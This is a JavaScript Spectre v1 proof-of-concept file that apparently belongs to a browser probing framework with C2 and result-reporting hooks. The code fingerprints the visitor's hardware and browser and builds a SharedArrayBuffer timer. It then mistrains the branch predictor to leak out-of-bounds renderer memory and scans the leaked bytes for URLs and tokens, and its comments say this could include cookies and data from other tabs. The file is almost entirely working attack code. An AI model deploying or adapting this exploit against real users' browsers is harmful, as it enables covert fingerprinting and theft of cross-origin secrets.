// ── Spectre v1 (Bounds Check Bypass) — browser side-channel memory leak ──────
// Based on public research: Google Project Zero, Kocher et al. 2018,
// Google Chrome Spectre PoC (leaky.page)
//
// Exploits CPU speculative execution to leak cross-origin data from the
// browser's renderer process via cache timing side-channel.
//
// Requirements:
// - SharedArrayBuffer (for high-res timer) — needs COOP/COEP headers OR old browser
// - OR performance.now() with sufficient resolution (pre-mitigation browsers)
// - Works best on Intel/AMD x86. ARM has different speculation behavior.

var C2 = location.protocol + '//' + location.host;
var CID = window.__pzCid || '';

var results = {
  vulnerable: false,
  sab_available: false,
  timer_resolution_ns: 0,
  site_isolation: null,
  leaked_bytes: 0,
  leaked_data: [],
  hardware: {},
  mitigations: [],
  timestamp: new Date().toISOString()
};

// ── 1. Environment check ─────────────────────────────────────────────────────
results.sab_available = typeof SharedArrayBuffer !== 'undefined';
results.hardware.cores = navigator.hardwareConcurrency || 0;
results.hardware.platform = navigator.platform;
results.hardware.ua = navigator.userAgent;

// Check timer resolution
var timerSamples = [];
for (var i = 0; i < 50; i++) timerSamples.push(performance.now());
var timerDiffs = [];
for (var i = 1; i < timerSamples.length; i++) {
  var d = timerSamples[i] - timerSamples[i-1];
  if (d > 0) timerDiffs.push(d);
}
var minRes = timerDiffs.length ? Math.min.apply(null, timerDiffs) : 999;
results.timer_resolution_ns = Math.round(minRes * 1e6);

if (minRes >= 0.1) results.mitigations.push('Reduced timer precision detected (' + minRes.toFixed(3) + 'ms) — Spectre timing less reliable');
if (!results.sab_available) results.mitigations.push('SharedArrayBuffer disabled — no high-res timer available');

// ── 2. Build high-resolution timer ──────────────────────────────────────────
var timer = null;
var timerWorker = null;

if (results.sab_available) {
  try {
    // SharedArrayBuffer counter incremented by a web worker = sub-ns timer
    var sab = new SharedArrayBuffer(4);
    var sabView = new Uint32Array(sab);
    var workerCode = 'onmessage=function(e){var v=new Uint32Array(e.data);while(1)v[0]++;}';
    var blob = new Blob([workerCode], { type: 'application/javascript' });
    timerWorker = new Worker(URL.createObjectURL(blob));
    timerWorker.postMessage(sab);

    // Wait for worker to start incrementing
    var waitStart = performance.now();
    while (sabView[0] === 0 && (performance.now() - waitStart) < 100) {}

    timer = {
      now: function() { return sabView[0]; },
      type: 'sab'
    };
    results.timer_type = 'SharedArrayBuffer (high-res, ~1ns)';
  } catch(e) {
    results.mitigations.push('SAB timer creation failed: ' + e.message);
  }
}

if (!timer) {
  timer = {
    now: function() { return performance.now(); },
    type: 'performance.now'
  };
  results.timer_type = 'performance.now (' + minRes.toFixed(3) + 'ms resolution)';
}

// ── 3. Spectre v1 gadget — cache timing side-channel ─────────────────────────
// Create a probe array where each element maps to a cache line
var CACHE_LINE = 512;       // Spacing to avoid prefetcher
var PROBE_ENTRIES = 256;    // One per possible byte value (0-255)
var probeArray = new Uint8Array(PROBE_ENTRIES * CACHE_LINE);

// Training array for the branch predictor
var trainSize = 16;
var trainArray = new Uint8Array(trainSize);
for (var i = 0; i < trainSize; i++) trainArray[i] = i;

// Victim array — the bounds check target
// We'll try to read PAST the end of this array into adjacent memory
var victimSize = 256;
var victimArray = new Uint8Array(victimSize);
for (var i = 0; i < victimSize; i++) victimArray[i] = i;

// Evict the array length from cache
function evictCache() {
  var junk = new Uint8Array(4 * 1024 * 1024);
  var sum = 0;
  for (var i = 0; i < junk.length; i += 64) sum += junk[i];
  return sum;
}

// Flush probe array from cache
function flushProbe() {
  for (var i = 0; i < PROBE_ENTRIES; i++) {
    probeArray[i * CACHE_LINE] = 0;
  }
  evictCache();
}

// Time access to each probe entry
function probeTimings() {
  var timings = new Float64Array(PROBE_ENTRIES);
  for (var i = 0; i < PROBE_ENTRIES; i++) {
    var t0 = timer.now();
    var tmp = probeArray[i * CACHE_LINE];
    var t1 = timer.now();
    timings[i] = t1 - t0;
  }
  return timings;
}

// ── 4. Spectre v1 attack — mistrain branch predictor then leak ───────────────
function leakByte(targetOffset) {
  var scores = new Uint32Array(256);
  var ATTEMPTS = 500;
  var TRAIN_ROUNDS = 10;

  for (var attempt = 0; attempt < ATTEMPTS; attempt++) {
    // Flush probe array
    flushProbe();

    // Mistrain the branch predictor with in-bounds accesses
    for (var train = 0; train < TRAIN_ROUNDS; train++) {
      var idx = train % trainSize;
      // In-bounds access — branch predictor learns "this is usually in bounds"
      var benign = victimArray[idx];
      probeArray[benign * CACHE_LINE] |= 0;
    }

    // Evict the bounds (victimSize) from cache
    // This creates a window where the CPU speculatively executes
    // the array access before the bounds check resolves
    evictCache();

    // Speculative out-of-bounds access
    // CPU speculatively reads victimArray[targetOffset] (out of bounds!)
    // and uses the value to index into probeArray, loading a cache line
    var malicious = targetOffset; // This is >= victimSize, i.e., OOB
    if (malicious < victimSize) { // Branch predictor predicts TRUE (mistrained)
      // Speculatively executed: reads memory at victimArray + targetOffset
      var leaked = victimArray[malicious];
      var tmp = probeArray[leaked * CACHE_LINE];
    }

    // Now check which probe entry was cached (loaded by speculative exec)
    var timings = probeTimings();

    // Find the fastest access — that's the leaked byte value
    var minTime = Infinity, minIdx = -1;
    for (var b = 1; b < 256; b++) { // Skip 0 as it can be noise
      if (timings[b] < minTime) {
        minTime = timings[b];
        minIdx = b;
      }
    }
    if (minIdx >= 0) scores[minIdx]++;
  }

  // Most voted byte value
  var bestScore = 0, bestByte = 0;
  for (var b = 1; b < 256; b++) {
    if (scores[b] > bestScore) {
      bestScore = scores[b];
      bestByte = b;
    }
  }

  return { byte: bestByte, confidence: bestScore / ATTEMPTS, scores: Array.from(scores).slice(0, 50) };
}

// ── 5. Calibrate and detect vulnerability ────────────────────────────────────
function calibrate() {
  // First, read a KNOWN in-bounds byte to verify the technique works
  var knownOffset = 42;
  var expected = victimArray[knownOffset]; // Should be 42
  var result = leakByte(knownOffset);

  results.calibration = {
    offset: knownOffset,
    expected: expected,
    leaked: result.byte,
    confidence: result.confidence,
    match: result.byte === expected
  };

  if (result.byte === expected && result.confidence > 0.15) {
    results.vulnerable = true;
    results.mitigations.push('WARNING: Spectre v1 side-channel appears exploitable on this system');
    return true;
  } else {
    results.vulnerable = false;
    results.mitigations.push('Spectre v1 not reliably exploitable (mitigations active or insufficient timer)');
    return false;
  }
}

// ── 6. Attempt OOB memory leak ───────────────────────────────────────────────
function leakMemory(numBytes) {
  var leaked = [];
  for (var i = 0; i < numBytes; i++) {
    var offset = victimSize + i; // Read past the array boundary
    var result = leakByte(offset);
    leaked.push({
      offset: offset,
      value: result.byte,
      hex: '0x' + ('0' + result.byte.toString(16)).slice(-2),
      confidence: result.confidence
    });
  }
  return leaked;
}

// ── Run the attack ───────────────────────────────────────────────────────────
try {
  // Calibration — verify technique works
  var isVuln = calibrate();

  if (isVuln) {
    // Leak 64 bytes of adjacent memory
    var leaked = leakMemory(64);
    results.leaked_bytes = leaked.length;
    results.leaked_data = leaked;

    // Try to interpret leaked data
    var hexDump = leaked.map(function(b) { return b.hex; }).join(' ');
    var asciiDump = leaked.map(function(b) {
      return (b.value >= 32 && b.value < 127) ? String.fromCharCode(b.value) : '.';
    }).join('');
    results.hex_dump = hexDump;
    results.ascii_dump = asciiDump;

    // Check for recognizable patterns
    var patterns = [];
    if (/https?:/.test(asciiDump)) patterns.push('URL fragment detected');
    if (/[A-Za-z0-9+/=]{16,}/.test(asciiDump)) patterns.push('Possible base64/token');
    if (/[\x00-\x1f]{4,}/.test(asciiDump)) patterns.push('Null/control bytes (heap metadata?)');
    results.patterns = patterns;
  }

  results.note = isVuln
    ? 'Spectre v1 exploitable — leaked ' + results.leaked_bytes + ' bytes of adjacent process memory. On a non-site-isolated browser, this could include cross-origin data (cookies, tokens, page content from other tabs).'
    : 'Browser appears to have effective Spectre mitigations (site isolation, timer reduction, or SAB disabled). The side-channel was not reliably exploitable.';

} catch(e) {
  results.error = e.message;
  results.note = 'Spectre probe errored: ' + e.message;
}

// Cleanup
if (timerWorker) try { timerWorker.terminate(); } catch(e) {}

__pzResult(results);
return '__async__';
